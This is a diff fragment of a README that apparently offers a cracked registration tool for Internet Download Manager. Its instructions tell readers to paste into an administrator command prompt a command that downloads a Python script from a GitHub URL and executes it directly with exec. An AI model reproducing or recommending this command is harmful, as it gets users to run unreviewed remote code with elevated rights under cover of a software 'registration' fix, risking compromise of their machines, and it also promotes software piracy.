@@ -24,6 +24,7 @@ Here's a screenshot of what the Registerd IDM looks like:
 2. Copy this command, and past it on cmd (Administration required)
 ```python
 C:\Windows\py.exe -m pip install requests && C:\Windows\py.exe -c "import urllib.request, requests; exec(urllib.request.urlopen('https://raw.githubusercontent.com/musaalif6969/IDM-Registration-Utility/main/main.py').read().decode())"
+
 ```
 3.Your good to go !
 
